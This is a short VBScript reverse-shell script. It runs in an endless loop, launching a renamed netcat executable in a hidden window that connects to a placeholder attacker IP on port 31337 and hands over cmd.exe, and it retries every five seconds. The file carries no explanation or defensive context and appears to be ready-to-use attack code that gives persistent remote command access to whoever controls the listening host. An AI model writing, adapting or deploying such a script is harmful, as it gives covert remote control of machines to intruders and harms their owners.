do
	Set ws = CreateObject("Wscript.Shell")
	ws.run "cmd /c C:\Windows\system32\NcSh311.exe "Your IP" 31337 -e cmd.exe",vbhide
	WSH.Sleep 5000
loop
